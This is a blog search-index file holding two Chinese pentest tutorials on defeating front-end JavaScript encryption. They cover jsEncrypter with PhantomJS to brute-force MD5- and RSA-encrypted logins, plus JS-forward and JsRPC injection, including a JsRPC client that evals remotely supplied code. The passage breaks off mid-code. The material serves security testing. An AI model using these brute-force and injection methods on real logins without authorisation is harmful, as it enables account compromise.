<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>再谈前端js加密抗衡</title>
    <link href="/2024/09/17/%E5%86%8D%E8%B0%88%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/"/>
    <url>/2024/09/17/%E5%86%8D%E8%B0%88%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上一篇我们提到了，在遇到js加密的时候，我们可以通过js-forward、jsrpc注入或者mitmproxy做中间代理进行数据转发等方式进行前端加密的抗衡，最近有些师傅给我推荐了另一种解决方案：jsEncrypter（burp插件）+phantomjs，说实话，之前还真没实践过，果然还是技术太菜，跟不上时代步伐！</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>用小皮开个测试环境</p><img src="/2024/09/17/%E5%86%8D%E8%B0%88%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-09-17_16-16.png" class="" title="2024-09-17_16-16.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>一个简易的web登陆框，并且可以进行base64,md5,RSA等加密方式</p><img src="/2024/09/17/%E5%86%8D%E8%B0%88%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-09-17_16-17.png" class="" title="2024-09-17_16-17.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><img src="/2024/09/17/%E5%86%8D%E8%B0%88%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-09-17_16-18.png" class="" title="2024-09-17_16-18.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>工具：<br>phantomjs：<a href="https://phantomjs.org/download.html">https://phantomjs.org/download.html</a><br>burp插件jsEncrypter：<a href="https://github.com/c0ny1/jsEncrypter/releases">https://github.com/c0ny1/jsEncrypter/releases</a></p><img src="/2024/09/17/%E5%86%8D%E8%B0%88%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-09-17_16-30.png" class="" title="2024-09-17_16-30.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>（这里我将这两个工具放在一个目录下了）</p><p>PhantomJS是一个基于webkit的javaScript API。jsEncrypter依赖phantomjs，启动前端加密函数对数据进行加密，phantomjs会返回加密结果传给burp，因此此插件需要启动phantomjs开启服务，burp去读取结果。</p><p>先看一下md5加密：抓包，，嗯还是熟悉的味道..</p><img src="/2024/09/17/%E5%86%8D%E8%B0%88%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-09-17_17-22.png" class="" title="2024-09-17_17-22.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>使用f12大法，过滤关键词password定位可疑加密函数，并打上断点发送数据包</p><img src="/2024/09/17/%E5%86%8D%E8%B0%88%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-09-17_18-52.png" class="" title="2024-09-17_18-52.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>通过单步调试，发现定位到了一个md5.js</p><img src="/2024/09/17/%E5%86%8D%E8%B0%88%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-09-17_18-53.png" class="" title="2024-09-17_18-53.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>将加密的js代码复制下来，另存为本地，与phantomjs和jsEncrypter放在一个目录下</p><img src="/2024/09/17/%E5%86%8D%E8%B0%88%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-09-17_17-01.png" class="" title="2024-09-17_17-01.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>修改phantomjs_server.js文件，这里要改两个地方，第一个，引入刚才的js加密文件即md5.js，第二个，加上调用文件中的主函数</p><img src="/2024/09/17/%E5%86%8D%E8%B0%88%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-09-17_17-00.png" class="" title="2024-09-17_17-00.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>保存好之后，启动phantomjs，但是我报错了….(当时排查半天，就是一个劲的报错)</p><img src="/2024/09/17/%E5%86%8D%E8%B0%88%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-09-17_17-15.png" class="" title="2024-09-17_17-15.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>上网一搜，才找到解决方案：在环境变量中加入如下值，使phantomjs能够找到指定的文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">OPENSSL_CONF</span>=/etc/ssl<br></code></pre></td></tr></table></figure><p>再次启动phantomjs并指定phantomjs_server.js文件运行，ok</p><img src="/2024/09/17/%E5%86%8D%E8%B0%88%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-09-17_17-16.png" class="" title="2024-09-17_17-16.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>我们可以发现开了一个端口并启动了一个服务端，打开burp加载插件，并连接phantomjs启动的webserver，如果显示绿色True，则表示连接成功，test测试一下，左边的字典确实转成md5加密了</p><img src="/2024/09/17/%E5%86%8D%E8%B0%88%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-09-17_17-17.png" class="" title="2024-09-17_17-17.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>加入字典后，在intruder模块中加载该插件（Invoke Burp extension）</p><img src="/2024/09/17/%E5%86%8D%E8%B0%88%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-09-17_17-25.png" class="" title="2024-09-17_17-25.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>最后开始爆破，可以看到是成功的</p><img src="/2024/09/17/%E5%86%8D%E8%B0%88%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-09-17_17-28.png" class="" title="2024-09-17_17-28.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>其他加密方式也是同理的，接下来再简单说说RSA，现在抓个包看一下，嗯..依旧是熟悉的味道</p><img src="/2024/09/17/%E5%86%8D%E8%B0%88%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-09-17_19-13.png" class="" title="2024-09-17_19-13.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>假设现在有这么一个场景：通过js敏感信息泄漏，泄漏了一个公钥（额..现在几乎很少出现公钥泄漏的情况了，主要是看方法）</p><img src="/2024/09/17/%E5%86%8D%E8%B0%88%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-09-17_18-59.png" class="" title="2024-09-17_18-59.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><p>然后还是老样子，找加密函数、打断点，发现定位到了一个jsencrypt.js</p><img src="/2024/09/17/%E5%86%8D%E8%B0%88%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-09-17_19-01.png" class="" title="2024-09-17_19-01.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><img src="/2024/09/17/%E5%86%8D%E8%B0%88%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-09-17_19-02.png" class="" title="2024-09-17_19-02.png"><p>依旧老样子复制加密代码，保存本地，随后编辑phantomjs_server.js文件，这里添加调用文件中主函数的写法和其他加密算法有一点不同，需要加入公钥</p><img src="/2024/09/17/%E5%86%8D%E8%B0%88%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-09-17_19-10.png" class="" title="2024-09-17_19-10.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><p>随后burp连接phantomjs，并且可以看到字典都进行了RSA加密，ok</p><img src="/2024/09/17/%E5%86%8D%E8%B0%88%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-09-17_19-11.png" class="" title="2024-09-17_19-11.png"><h6 id="-18"><a href="#-18" class="headerlink" title=""></a></h6><p>爆破当然也是ok的</p><img src="/2024/09/17/%E5%86%8D%E8%B0%88%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-09-17_19-15.png" class="" title="2024-09-17_19-15.png"><h6 id="-19"><a href="#-19" class="headerlink" title=""></a></h6>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>前端JS加密抗衡</title>
    <link href="/2024/06/29/%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/"/>
    <url>/2024/06/29/%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>现如今越来越多的站点使用前端数据加密，从之前传统的base64、md5变向AES、RSA、或SM2&#x2F;SM4(国产替代RSA)加密，有时候或干脆进行签名校验，这就需要我们逆向提取加密算法以及密钥，过程相对繁琐复杂，并且越来越多行业的内部系统使用了加密技术对HTTP的请求体加密, 时间戳, RequestId等防止进行数据包的抓包改包，这样一来增大了安全测试人员的测试难度，也使得很多不懂加密测试的人员望而却步</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>从测试人员的角度出发，当我们拿到一个站点，在抓包时我们都希望碰到的是明文传输，因为简单且清晰明了，方便我们做测试，如下图</p><img src="/2024/06/29/%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-06-29_15-49.png" class="" title="2024-06-29_15-49.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>但是现如今这样的站点是少之又少，大多数都进行了加密处理，这就要求我们对JS逆向和前端调试有一定的了解，说起JS逆向，那都是老生常谈了，想找到JS中的加解密的方法，需要我们首先快速定位到加解密函数和明文点的位置，以下面这个站点为例，一个很常规很普通很常见的登录</p><img src="/2024/06/29/%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-06-29_15-57.png" class="" title="2024-06-29_15-57.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>在开始之前给大家推荐一款Google浏览器插件：v_jstools，能够一键监测JS中指定函数的调用，下载好之后，本地导入插件即可，在配置v_jstools的时候一定要注意不要全部勾选，根据实际情况选择需要挂钩的函数即可，否则信息流太大干扰我们测试</p><img src="/2024/06/29/%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-06-29_16-04.png" class="" title="2024-06-29_16-04.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>一切都配置好后，打开挂钩功能，并F12打开浏览器控制台，此时刷新页面，如果出现“inject start!”则表示插件生效了</p><img src="/2024/06/29/%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-06-28_11-42.png" class="" title="2024-06-28_11-42.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>当我们输入账号密码发送数据时，针对请求包，v_jstools帮我们找到了请求的明文点</p><img src="/2024/06/29/%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-06-29_16-12.png" class="" title="2024-06-29_16-12.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>既然定位到了请求的明文点，那就跟进对应的JS文件，并在该代码处（JSON.stringify）打上断点跟踪</p><img src="/2024/06/29/%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-06-29_16-17.png" class="" title="2024-06-29_16-17.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>当我们重新发送数据包，点击步过一次，就可以很容易的发现n变量就是我们提交的账号密码明文内容</p><img src="/2024/06/29/%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-06-28_09-43.png" class="" title="2024-06-28_09-43.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>继续点击步过，经过t.data&#x3D;l(n)后，data内容为密文，并且通过对作用域中的请求包比较，发现t.data即为加密后的内容，那么l()函数即为加密函数</p><img src="/2024/06/29/%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-06-28_09-49.png" class="" title="2024-06-28_09-49.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><img src="/2024/06/29/%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-06-28_14-40.png" class="" title="2024-06-28_14-40.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>说干就干！我们跟进l()函数中看看，发现l函数即为加密函数，并且在附近也发现了解密函数，其中t参数为原始的内容，f参数为密钥，h为密码</p><img src="/2024/06/29/%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-06-28_10-12.png" class="" title="2024-06-28_10-12.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>再返回看，我们也可以发现requestID算法，时间戳算法和签名算法</p><img src="/2024/06/29/%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-06-28_10-31.png" class="" title="2024-06-28_10-31.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>假设现在我们知道了正确的账号密码：test&#x2F;123，我们如何修改数据包，这里有三种解决方案，第一种方案就是直接在明文点修改，进入到调试中，走到加密前的一步，直接在作用域中修改</p><img src="/2024/06/29/%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-06-28_10-39.png" class="" title="2024-06-28_10-39.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>不过这种方式可能会引文加密方式和一些签名的限制，可能修改无效，有很大的局限性，赌一赌还是可以的。第二种方式需要用到JS-forward，大致的原理就是在明文点处插入一段JS代码，这段代码会通过AJAX请求发送给bp，bp做拦截处理并修改内容后，会将数值返回到原始变量中，首先确定明文变量名，通过调试，可以判定明文变量就是t.data</p><img src="/2024/06/29/%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-06-28_10-59.png" class="" title="2024-06-28_10-59.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>随后启动JS-forward，输入变量名、数据类型、请求标识（REQUEST），输入$end 结束后，会开启2个端口进行监听，分别是38080和28080，并且会生成一段js代码，这段代码就是我们即将插入到明文点的代码</p><img src="/2024/06/29/%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-06-28_11-01.png" class="" title="2024-06-28_11-01.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>在插入修改JS代码之前，要注意的是，我们需要新创一个文件夹，然后F12,找到对应的源代码进行替换，否则是无法直接进行修改JS中的代码，成功的话，右下角会有一个紫色圆的标识</p><img src="/2024/06/29/%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-06-28_11-05.png" class="" title="2024-06-28_11-05.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>然后将刚才生成的JS代码复制到明文点函数的第一行，最后保存</p><img src="/2024/06/29/%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-06-28_11-12.png" class="" title="2024-06-28_11-12.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><p>关闭F12，刷新页面再次发包时bp即可接收到明文信息</p><img src="/2024/06/29/%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-06-28_11-34.png" class="" title="2024-06-28_11-34.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><p>第三种方式是通过JSrpc注入，主动主动发包加解密，需要借助工具JS-RPC，这款工具的工作原理就是在浏览器控制台中执行一段代码，通过websocket与本地的python服务端进行连接，当我们想要执行代码，只需要通过RPC调用控制台中的函数即可，打开客户端，然后在控制台中输入JSrpc的注入代码，代码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Hlclient</span>(<span class="hljs-params">wsURL</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">wsURL</span> = wsURL;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">handlers</span> = &#123;<br>        <span class="hljs-attr">_execjs</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">resolve, param</span>) &#123;<br>            <span class="hljs-keyword">var</span> res = <span class="hljs-built_in">eval</span>(param)<br>            <span class="hljs-keyword">if</span> (!res) &#123;<br>                <span class="hljs-title function_">resolve</span>(<span class="hljs-string">&quot;没有返回值&quot;</span>)<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-title function_">resolve</span>(res)<br>            &#125;<br><br>        &#125;<br>    &#125;;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">socket</span> = <span class="hljs-literal">undefined</span>;<br>    <span class="hljs-keyword">if</span> (!wsURL) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;wsURL can not be empty!!&#x27;</span>)<br>    &#125;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">connect</span>()<br>&#125;<br><br><span class="hljs-title class_">Hlclient</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">connect</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;begin of connect to wsURL: &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">wsURL</span>);<br>    <span class="hljs-keyword">var</span> _this = <span class="hljs-variable language_">this</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">socket</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">wsURL</span>);<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">socket</span>.<span class="hljs-property">onmessage</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) &#123;<br>            _this.<span class="hljs-title function_">handlerRequest</span>(e.<span class="hljs-property">data</span>)<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;connection failed,reconnect after 10s&quot;</span>);<br>        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>            _this.<span class="hljs-title function_">connect</span>()<br>        &#125;, <span class="hljs-number">10000</span>)<br>    &#125;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">socket</span>.<span class="hljs-property">onclose</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;rpc已关闭&#x27;</span>);<br>        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>            _this.<span class="hljs-title function_">connect</span>()<br>        &#125;, <span class="hljs-number">10000</span>)<br>    &#125;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">socket</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;rpc连接成功&quot;</span>);<br>    &#125;);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">socket</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;rpc连接出错,请检查是否打开服务端:&#x27;</span>, event.<span class="hljs-property">error</span>);<br>    &#125;);<br><br>&#125;;<br><span class="hljs-title class_">Hlclient</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">send</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">msg</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">socket</span>.<span class="hljs-title function_">send</span>(msg)<br>&#125;<br><br><span class="hljs-title class_">Hlclient</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">regAction</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">func_name, func</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> func_name !== <span class="hljs-string">&#x27;string&#x27;</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;an func_name must be string&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> func !== <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;must be function&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;register func_name: &quot;</span> + func_name);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">handlers</span>[func_name] = func;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br><br>&#125;<br><br><span class="hljs-comment">//收到消息后这里处理，</span><br><span class="hljs-title class_">Hlclient</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">handlerRequest</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">requestJson</span>) &#123;<br>    <span class="hljs-keyword">var</span> _this = <span class="hljs-variable language_">this</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">var</span> result = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(requestJson)<br>    &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;catch error&quot;</span>, requestJson);<br>        result = <span class="hljs-title function_">transjson</span>(requestJson)<br>    &#125;<br>    <span class="hljs-comment">//console.log(result)</span><br>    <span class="hljs-keyword">if</span> (!result[<span class="hljs-string">&#x27;action&#x27;</span>]) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">sendResult</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;need request param &#123;action&#125;&#x27;</span>);<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">var</span> action = result[<span class="hljs-string">&quot;action&quot;</span>]<br>    <span class="hljs-keyword">var</span> theHandler = <span class="hljs-variable language_">this</span>.<span class="hljs-property">handlers</span>[action];<br>    <span class="hljs-keyword">if</span> (!theHandler) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">sendResult</span>(action, <span class="hljs-string">&#x27;action not found&#x27;</span>);<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (!result[<span class="hljs-string">&quot;param&quot;</span>]) &#123;<br>            <span class="hljs-title function_">theHandler</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">response</span>) &#123;<br>                _this.<span class="hljs-title function_">sendResult</span>(action, response);<br>            &#125;)<br>            <span class="hljs-keyword">return</span><br>        &#125;<br>        <span class="hljs-keyword">var</span> param = result[<span class="hljs-string">&quot;param&quot;</span>]<br>        <span class="hljs-keyword">try</span> &#123;<br>            param = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(param)<br>        &#125; <span class="hljs-keyword">catch</span> (e) &#123;&#125;<br>        <span class="hljs-title function_">theHandler</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">response</span>) &#123;<br>            _this.<span class="hljs-title function_">sendResult</span>(action, response);<br>        &#125;, param)<br><br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;error: &quot;</span> + e);<br>        _this.<span class="hljs-title function_">sendResult</span>(action, e);<br>    &#125;<br>&#125;<br><br><span class="hljs-title class_">Hlclient</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sendResult</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">action, e</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> e === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; e !== <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            e = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(e)<br>        &#125; <span class="hljs-keyword">catch</span> (v) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(v)<span class="hljs-comment">//不是json无需操作</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-variable 